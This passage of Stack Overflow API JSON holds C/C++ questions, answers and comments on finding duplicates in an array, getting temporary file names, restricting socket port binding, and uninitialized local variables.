would probably confirm it with &quot;I assume the array is unsorted?&quot;, just to let the interviewer know I had thought of it, but I&#39;d be pretty surprised if the answer was &quot;No, it&#39;s sorted, next question&quot;.  What&#39;s the point?"}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457525915, "post_id": 35890626, "comment_id": 59443617, "body": "The point is: I want the candidate to come up with the simplest solution. Even if it requires discussion and maybe re-work in other places. Because that is what I would expect from an engineer working in my team. Hashing is a nice solution to the problem given the constraints, but If you&#39;d do that in a real team you&#39;d probably have to be fired...."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457526146, "post_id": 35890626, "comment_id": 59443790, "body": "If you&#39;re interviewing bright people, and the solution was &quot;oh, sorry, I forgot to tell you the array is already sorted&quot;, they&#39;d probably finding it insulting.  I know I would.  Any such condition should be part of the problem statement.  It isn&#39;t something someone would fail to notice in a real problem."}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457526465, "post_id": 35890626, "comment_id": 59444038, "body": "Come to think of it: If you wouldn&#39;t ask for a sorted array, I&#39;d probably not hire you. There you are."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457529886, "post_id": 35890626, "comment_id": 59446468, "body": "So if I didn&#39;t ask that someone execute an O(n*log(n)) algorithm before giving me the problem, so that I could then solve it in an additional O(n) time?  Seriously?  Why not go one better, and require that all the duplicates appear at the front of the array?  This is a <i>useless</i> answer, it is not clever, and you aren&#39;t thinking of anything that isn&#39;t obvious to anyone who hears it.  This is a very elementary interview question, and you failed to answer it.  Sorry."}], "tags": [], "owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "is_accepted": false, "score": -1, "last_activity_date": 1457523647, "creation_date": 1457523647, "answer_id": 35890626, "question_id": 35889887, "link": "https://stackoverflow.com/questions/35889887/finding-duplicates-in-array/35890626#35890626", "title": "Finding duplicates in array", "body": "<p>Simple - but creative - solution: \nPropose the requirement the array should be sorted - Then its going to be trivial. (But that is how interview questions work)</p>\n"}, {"tags": [], "owner": {"reputation": 2971, "user_id": 3066450, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/Dd0B2.jpg?s=128&g=1", "display_name": "ebby94", "link": "https://stackoverflow.com/users/3066450/ebby94"}, "is_accepted": false, "score": 0, "last_activity_date": 1457526815, "last_edit_date": 1495542691, "creation_date": 1457526815, "answer_id": 35891727, "question_id": 35889887, "link": "https://stackoverflow.com/questions/35889887/finding-duplicates-in-array/35891727#35891727", "title": "Finding duplicates in array", "body": "<p>Since you did not mention anything about the array, I'd say it isn't possible to do it in single pass. I'm not sure if counting sort is the answer you're looking for. So, the only solution to your problem is to use a dictionary. This is the most simplest implementation of a dictionary I could find in C.</p>\n\n<p><a href=\"https://stackoverflow.com/questions/4384359/quick-way-to-implement-dictionary-in-c\">Quick Way to Implement Dictionary in C</a> </p>\n\n<p>Hope this helps.</p>\n"}, {"tags": [], "owner": {"reputation": 893, "user_id": 2998050, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/LGxPu.jpg?s=128&g=1", "display_name": "Akash Magoon", "link": "https://stackoverflow.com/users/2998050/akash-magoon"}, "is_accepted": false, "score": 0, "last_activity_date": 1457714315, "creation_date": 1457714315, "answer_id": 35945438, "question_id": 35889887, "link": "https://stackoverflow.com/questions/35889887/finding-duplicates-in-array/35945438#35945438", "title": "Finding duplicates in array", "body": "<p>Since you want to find duplicates in linear time, e.g. one pass, you must use an additional data structure to count the number of times each element appears. </p>\n\n<p>Here I assume the array is of integers. This would work for any type though. I use a HashMap that uses the elements, in this case integers, as the key, and the number of occurrences as the value. </p>\n\n<pre><code>public static ArrayList&lt;Integer&gt; findDuplicates(int[] arr) {\n\n   HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;Integer, Integer&gt;();\n   for (int i = 0; i &lt; arr.length; i++) {\n       if (!map.containsKey(arr[i]))\n           map.put(arr[i], 1);\n       else\n           map.put(arr[i], map.get(arr[i]) + 1);\n   }\n\n   ArrayList&lt;Integer&gt; dups = new ArrayList&lt;Integer&gt;();\n\n   for (Integer i : map.keySet())\n       if (map.get(i) &gt; 1)\n            dups.add(i);\n\n  return dups;\n}\n</code></pre>\n\n<p>So</p>\n\n<pre><code>int arr[] = {1,2,3,4,2,1,2,3,4,5,6,7,8};\nfindDuplicates(arr);\n</code></pre>\n\n<p>would return <code>[1, 2, 3, 4]</code>.</p>\n"}], "owner": {"reputation": 291, "user_id": 5788013, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/191600f2210d8c50477a2e0e3db7b311?s=128&d=identicon&r=PG&f=1", "display_name": "Multi stack", "link": "https://stackoverflow.com/users/5788013/multi-stack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 426, "favorite_count": 1, "accepted_answer_id": 35890091, "answer_count": 5, "score": 4, "last_activity_date": 1457714315, "creation_date": 1457521759, "last_edit_date": 1457525566, "question_id": 35889887, "link": "https://stackoverflow.com/questions/35889887/finding-duplicates-in-array", "title": "Finding duplicates in array", "body": "<p>I know how to find duplicate elements in array but recently in an interview question, I was asked to find duplicate elements in array in a single pass meaning without using nested loops and recursion. I tried but failed. The interviewer wasn't kind enough to even give me a hint. So I came here to ask, Is it possible to find duplicate elements in array without nested loops/recursion? If yes can anybody give an example code? Also Library functions are not allowed</p>\n\n<p><strong>P.S</strong> I would also like to know what impact does it have if we don't use loops or recursion. Is it related to complexity?</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 4944, "user_id": 4877767, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/RO6mn.png?s=128&g=1", "display_name": "marom", "link": "https://stackoverflow.com/users/4877767/marom"}, "edited": false, "score": 1, "creation_date": 1457521732, "post_id": 35889814, "comment_id": 59440678, "body": "If you need a file name then there is no point in using tmpfile()"}, {"owner": {"reputation": 14872, "user_id": 3919155, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/3034f14bf0b65847592b2c2e08b9253e?s=128&d=identicon&r=PG&f=1", "display_name": "jotik", "link": "https://stackoverflow.com/users/3919155/jotik"}, "edited": false, "score": 0, "creation_date": 1457521992, "post_id": 35889814, "comment_id": 59440838, "body": "Are you targeting a specific system (e.g. Linux or POSIX) or do you need it to be portable?"}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1457522104, "post_id": 35889814, "comment_id": 59440907, "body": "What about using <a href=\"http://linux.die.net/man/3/mktemp\" rel=\"nofollow noreferrer\"><code>mktemp()</code></a> instead?"}, {"owner": {"reputation": 962, "user_id": 1891266, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/83ed20378bcbcf07ccc4969c6bf9874b?s=128&d=identicon&r=PG", "display_name": "vcp", "link": "https://stackoverflow.com/users/1891266/vcp"}, "edited": false, "score": 0, "creation_date": 1457522140, "post_id": 35889814, "comment_id": 59440927, "body": "Some useful answers here : <a href=\"http://stackoverflow.com/questions/1022487/how-to-create-a-temporary-text-file-in-c\" title=\"how to create a temporary text file in c\">stackoverflow.com/questions/1022487/&hellip;</a>"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457522299, "post_id": 35889814, "comment_id": 59441038, "body": "<code>mktemp</code> is unsafe due to possible race conditions."}, {"owner": {"reputation": 5013, "user_id": 4181011, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0C2A9.jpg?s=128&g=1", "display_name": "Simon Kraemer", "link": "https://stackoverflow.com/users/4181011/simon-kraemer"}, "edited": false, "score": 0, "creation_date": 1457523908, "post_id": 35889814, "comment_id": 59442276, "body": "How about creating your own RAII <code>tempfile</code> class that automatically deletes the file it points to when it&#39;s destroyed?"}, {"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "reply_to_user": {"reputation": 14872, "user_id": 3919155, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/3034f14bf0b65847592b2c2e08b9253e?s=128&d=identicon&r=PG&f=1", "display_name": "jotik", "link": "https://stackoverflow.com/users/3919155/jotik"}, "edited": false, "score": 0, "creation_date": 1457524477, "post_id": 35889814, "comment_id": 59442651, "body": "@jotik: <i>&quot;Linux or POSIX&quot;</i> o.O :P"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user6038872"}, "edited": false, "score": 1, "creation_date": 1457530887, "post_id": 35892477, "comment_id": 59447198, "body": "How can I get the temporary file path and file automatically delete on exit"}, {"owner": {"reputation": 2920, "user_id": 975132, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/0ed44cf511bbad4a7728f109bcab1313?s=128&d=identicon&r=PG", "display_name": "Caleb Gray", "link": "https://stackoverflow.com/users/975132/caleb-gray"}, "edited": false, "score": 0, "creation_date": 1476708226, "post_id": 35892477, "comment_id": 67445811, "body": "@hafiz: you probably want <a href=\"http://man7.org/linux/man-pages/man3/atexit.3.html\" rel=\"nofollow noreferrer\">atexit</a>."}], "tags": [], "owner": {"reputation": 44, "user_id": 6029545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc9f0403c09bf8deb69062fcd3ec18ca?s=128&d=identicon&r=PG&f=1", "display_name": "G. Toupin", "link": "https://stackoverflow.com/users/6029545/g-toupin"}, "is_accepted": false, "score": 0, "last_activity_date": 1457532199, "last_edit_date": 1457532199, "creation_date": 1457528794, "answer_id": 35892477, "question_id": 35889814, "link": "https://stackoverflow.com/questions/35889814/how-can-i-get-the-temporary-filename-by-using-the-tmpfile/35892477#35892477", "title": "How can I get the temporary filename by using the tmpfile ()", "body": "<p>Instead of using tmpfile(), you could use tmpname().</p>\n\n<p>It will return a filename that can be used to create a temporary file.</p>\n\n<p>See the following example (extracted from <a href=\"http://www.cplusplus.com/reference/cstdio/tmpnam/\" rel=\"nofollow\">http://www.cplusplus.com/reference/cstdio/tmpnam/</a>) :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main ()\n{\n   char buffer [L_tmpnam];\n   char *pointer;\n\n   tmpnam (buffer);\n   printf (\"Tempname #1: %s\\n\", buffer);\n\n   pointer = tmpnam (NULL);\n   printf (\"Tempname #2: %s\\n\", pointer);\n\n   return 0;  \n}\n</code></pre>\n\n<p>You can then use this filename to create your file and delete it upon exit.</p>\n\n<p><strong>Edit:</strong></p>\n\n<ul>\n<li><p>The name return by tmpnam doesn't specify any path. The default path used by fopen will be your current working directory.</p></li>\n<li><p>It is up to you to delete the file. It will not be done automatically. You can do it by calling <a href=\"http://www.cplusplus.com/reference/cstdio/remove/\" rel=\"nofollow\">remove</a>.</p></li>\n</ul>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user6038872"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 3896, "favorite_count": 0, "closed_date": 1457529108, "answer_count": 1, "score": 4, "last_activity_date": 1457532199, "creation_date": 1457521555, "last_edit_date": 1457522459, "question_id": 35889814, "link": "https://stackoverflow.com/questions/35889814/how-can-i-get-the-temporary-filename-by-using-the-tmpfile", "closed_reason": "Duplicate", "title": "How can I get the temporary filename by using the tmpfile ()", "body": "<p>tmpfile () functions says that:</p>\n\n<blockquote>\n  <p>The temporary file created is automatically deleted when the stream is closed (fclose) or when the program terminates normally. If the program terminates abnormally, whether the file is deleted depends on the specific system and library implementation.\"</p>\n</blockquote>\n\n<p>tmpfile () function returns a stream pointer to the temporary file created and not the path of file.\nI need temporary filename path as it needed to pass other library function.</p>\n\n<p>My application can exit abnormally so tmpfile () function can work here on abnormal exit.</p>\n\n<p>How can I get the temporary file path and file automatically delete on exit     </p>\n"}, {"tags": ["c++", "c", "sockets", "serversocket", "portforwarding"], "comments": [{"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 3, "creation_date": 1457521483, "post_id": 35889202, "comment_id": 59440529, "body": "No. You should either bind your socket to a fixed port or use a naming service or some other discovery mechanism for the clients to discover the service port. Hard to see what your proposal buys you."}, {"owner": {"reputation": 3713, "user_id": 855844, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/9x4Iu.jpg?s=128&g=1", "display_name": "Stefano", "link": "https://stackoverflow.com/users/855844/stefano"}, "reply_to_user": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1457525068, "post_id": 35889202, "comment_id": 59443029, "body": "that is what i was afraid to hear! :)"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 2, "creation_date": 1457562695, "post_id": 35889202, "comment_id": 59468327, "body": "Your question doesn&#39;t really make any sense. The port forwarding is based on the destination port, which is the port the server listens on. No &quot;forwarding&quot; is required based on the source port. Are you sure you actually enabled port forwarding? Listening ports never do dynamic binding."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1457562904, "post_id": 35889202, "comment_id": 59468419, "body": "Can you maybe edit the question to be more precise. Where did did you enable port forwarding? What precisely did you enable. What dynamic binding are you talking about? For the server&#39;s listening port? Or for a client&#39;s ephemeral port? How is the server&#39;s dynamic binding relevant, the server&#39;s not doing any dynamic binding. So what good would reducing that range do?"}, {"owner": {"reputation": 3713, "user_id": 855844, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/9x4Iu.jpg?s=128&g=1", "display_name": "Stefano", "link": "https://stackoverflow.com/users/855844/stefano"}, "edited": false, "score": 0, "creation_date": 1457594997, "post_id": 35889202, "comment_id": 59479431, "body": "Ok... i tought that when i was accepting the connection the new socket created would be using another port... and that this was also going to be randomly generated within the range. I wanted to reduce the range to few port so that i could set up a port forwarding for all of them. Reading what you wrote I probably need only to forward the listening port. right?"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 1, "creation_date": 1457639212, "post_id": 35889202, "comment_id": 59510031, "body": "@Stefano: the accepted socket has the same local port as the listening socket that accepted it. So you only need to forward the listening port, yes."}, {"owner": {"reputation": 3713, "user_id": 855844, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/9x4Iu.jpg?s=128&g=1", "display_name": "Stefano", "link": "https://stackoverflow.com/users/855844/stefano"}, "edited": false, "score": 0, "creation_date": 1457681154, "post_id": 35889202, "comment_id": 59525647, "body": "do you guys know how can i close this question without accepting the only answer?"}], "answers": [{"comments": [{"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 1, "creation_date": 1457562001, "post_id": 35903073, "comment_id": 59467982, "body": "I don&#39;t think you&#39;ve understood the question. He doesn&#39;t want to bind on multiple ports: he wants to bind to one of a restricted range of ports. Why, I don&#39;t know."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1457562226, "post_id": 35903073, "comment_id": 59468102, "body": "I answered the question asked: &quot;<i>Is there a way (like a parameter to the bind/accept) in which i could specify to my server socket that he has to reduce this range to few ports ie: [35000 35010]</i>&quot; - the answer is no, the socket can only bind to a specific port, not to a range of ports. Then I suggested how to bind in relation to ranges, if needed."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 2, "creation_date": 1457562795, "post_id": 35903073, "comment_id": 59468370, "body": "@RemyLebeau Even if there was  a way to bind to a range of ports, that wouldn&#39;t answer the question. That wouldn&#39;t reduce the range of source ports or have any effect on them."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 1, "creation_date": 1457563771, "post_id": 35903073, "comment_id": 59468838, "body": "There is nothing in the question about binding to multiple ports."}, {"owner": {"reputation": 3713, "user_id": 855844, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/9x4Iu.jpg?s=128&g=1", "display_name": "Stefano", "link": "https://stackoverflow.com/users/855844/stefano"}, "edited": false, "score": 0, "creation_date": 1457595134, "post_id": 35903073, "comment_id": 59479509, "body": "sorry guys, no need to warm up.. the fault it&#39;s mine. i tought that during the accept the new socket would be bound on a different port also on the server side to keep the original port only for listening and accepting other connections..."}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 3713, "user_id": 855844, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/9x4Iu.jpg?s=128&g=1", "display_name": "Stefano", "link": "https://stackoverflow.com/users/855844/stefano"}, "edited": false, "score": 1, "creation_date": 1457639177, "post_id": 35903073, "comment_id": 59510010, "body": "@Stefano: no, the accepted socket has the same local port as the listening socket that accepted it."}], "tags": [], "owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "is_accepted": true, "score": -2, "last_activity_date": 1457562430, "last_edit_date": 1457562430, "creation_date": 1457559233, "answer_id": 35903073, "question_id": 35889202, "link": "https://stackoverflow.com/questions/35889202/socket-dynamic-binding-to-reduced-range/35903073#35903073", "title": "Socket dynamic binding to reduced range", "body": "<p>A listening server socket must be bound to a specific port in order to accept client connections.  On most platforms, you can <code>bind()</code> a socket to port 0 and it will bind to a random available port.  But it is still binding to a specific port.</p>\n\n<p>You cannot bind a socket to a range of multiple ports. If you need to listen on multiple ports, you must create a separate listening socket for each port and <code>bind()</code> them individually (ie one socket on port 35000, one socket on port 35001, one socket on port 35002, and so on, up to port 35010).</p>\n\n<p>You cannot bind a socket to an available port within a given range, either. You can only bind to a specific port, or to port 0. If you need to listen on an available port within a given range, you must loop your call to <code>bind()</code>, starting at the lowest port and trying each port in sequence until either <code>bind()</code> is succeessful or the range is exhausted.</p>\n"}], "owner": {"reputation": 3713, "user_id": 855844, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/9x4Iu.jpg?s=128&g=1", "display_name": "Stefano", "link": "https://stackoverflow.com/users/855844/stefano"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 132, "favorite_count": 1, "accepted_answer_id": 35903073, "answer_count": 1, "score": 3, "last_activity_date": 1457562430, "creation_date": 1457519955, "question_id": 35889202, "link": "https://stackoverflow.com/questions/35889202/socket-dynamic-binding-to-reduced-range", "title": "Socket dynamic binding to reduced range", "body": "<p>I have a C++ Server socket who runs within a virtual machine.\nI have enabled the port forwarding for the port where the server socket is listening. However, due to dynamic binding I do not know on which port the communication will be done. \nThe OS i have within the virtual machine accepts dynamic binding in the following range:</p>\n\n<pre><code>cat /proc/sys/net/ipv4/ip_local_port_range \n32768   61000\n</code></pre>\n\n<p>Is there a way (like a parameter to the bind/accept) in which i could specify to my server socket that he has to reduce this range to few ports ie: <code>[35000 35010]</code></p>\n\n<p>Cheers</p>\n"}, {"tags": ["c", "initialization"], "comments": [{"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 5, "creation_date": 1457517615, "post_id": 35888304, "comment_id": 59437877, "body": "Zero is a possible garbage value."}, {"owner": {"reputation": 2462, "user_id": 2705907, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/e2UTS.jpg?s=128&g=1", "display_name": "Vagish", "link": "https://stackoverflow.com/users/2705907/vagish"}, "edited": false, "score": 2, "creation_date": 1457517641, "post_id": 35888304, "comment_id": 59437902, "body": "You should not seek explanation for <code>undefined behavior</code> .The answer would be platform as well as implementation dependent."}, {"owner": {"reputation": 615, "user_id": 3845853, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/88940dcd987189687693481451b946bb?s=128&d=identicon&r=PG&f=1", "display_name": "sakthi", "link": "https://stackoverflow.com/users/3845853/sakthi"}, "edited": false, "score": 0, "creation_date": 1457517727, "post_id": 35888304, "comment_id": 59437972, "body": "but every time i got zero.is it is garbage."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 2, "creation_date": 1457517918, "post_id": 35888304, "comment_id": 59438115, "body": "Yes, any value read from an uninitialised variable must be considered as garbage. And just because your simple program shows it  as zero for the few times you ran it does not mean it will actually always be zero. Try adding in some more unrelated code and chances are at some point it will show some other garbage value."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1457518528, "post_id": 35888304, "comment_id": 59438547, "body": "When you have your compiler set to generate a debug build, some bad compilers like VS stupidly sets all of the stack to zero. (Which is very bad, because it hides all bugs related to initialization and make them pop up far later, in release build only.) Meaning everything there is zero until used. When you call functions, various things are stored on the stack, likely non-zero values. This is not specified behavior though, and nothing you can rely upon."}], "answers": [{"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1457518724, "post_id": 35888378, "comment_id": 59438699, "body": "To be picky, it will only invoke undefined behavior if the value is a trap representation. Otherwise the value is just indeterminate - some random garbage. On a system without trap representations, it is perfectly fine to do things like <code>int x; printf(&quot;%d&quot;, x);</code>, though of course you can&#39;t know what it will print - it is <i>unspecified behavior</i>. Annex J of the C standard is not normative and refers to trap representations."}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 2, "last_activity_date": 1457517724, "creation_date": 1457517724, "answer_id": 35888378, "question_id": 35888304, "link": "https://stackoverflow.com/questions/35888304/why-uninitialized-local-variable-in-main-is-zeronot-garbage-in-c/35888378#35888378", "title": "Why uninitialized local variable in main is zero(not garbage) in c?", "body": "<p>For the unitialized automatic local variable, the value is <strong><em>indeterminate</em></strong>. That can be <em>anything</em>, including 0.</p>\n\n<p>Quoting <code>C11</code>, chapter \u00a76.7.9, <em>Initialization</em></p>\n\n<blockquote>\n  <p>If an object that has automatic storage duration is not initialized explicitly, its value is\n  indeterminate. [...]</p>\n</blockquote>\n\n<p>FWIW, any attempt to make use of that value, (including attempt to print), will invoke <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow\">undefined behavior</a>.</p>\n\n<p>Related, from the annex J, for undefined behavior</p>\n\n<blockquote>\n  <p>The value of an object with automatic storage duration is used while it is\n  indeterminate.</p>\n</blockquote>\n"}], "owner": {"reputation": 615, "user_id": 3845853, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/88940dcd987189687693481451b946bb?s=128&d=identicon&r=PG&f=1", "display_name": "sakthi", "link": "https://stackoverflow.com/users/3845853/sakthi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 224, "favorite_count": 0, "closed_date": 1457517849, "accepted_answer_id": 35888378, "answer_count": 1, "score": -2, "last_activity_date": 1457518153, "creation_date": 1457517533, "last_edit_date": 1457518153, "question_id": 35888304, "link": "https://stackoverflow.com/questions/35888304/why-uninitialized-local-variable-in-main-is-zeronot-garbage-in-c", "closed_reason": "Duplicate", "title": "Why uninitialized local variable in main is zero(not garbage) in c?", "body": "<p>I have some doubt in this simple program.</p>\n\n<pre><code>  void hello()\n  {\n      int a;\n      printf(\"uninitialized in hello: %d\\n\",a);\n  }\n\n  int main()\n  {\n      int value;\n      printf(\"uninitialized in main: %d\\n\",value);\n      hello();\n      return 0;\n  }\n</code></pre>\n\n<p>If i am compile and run this program.</p>\n\n<pre><code>  user@toad:~$ gcc -Wall simple.c\n  simple.c: In function \u2018hello\u2019:\n  simple.c:6:3: warning: \u2018a\u2019 is used uninitialized in this function [-Wuninitialized]\n       printf(\"uninitialized in hello: %d\\n\",a);\n       ^\n  simple.c: In function \u2018main\u2019:\n  simple.c:12:11: warning: \u2018value\u2019 is used uninitialized in this function [-Wuninitialized]\n       printf(\"uninitialized in main: %d\\n\",value);\n       ^\n\n  user@toad:~$ ./a.out \n  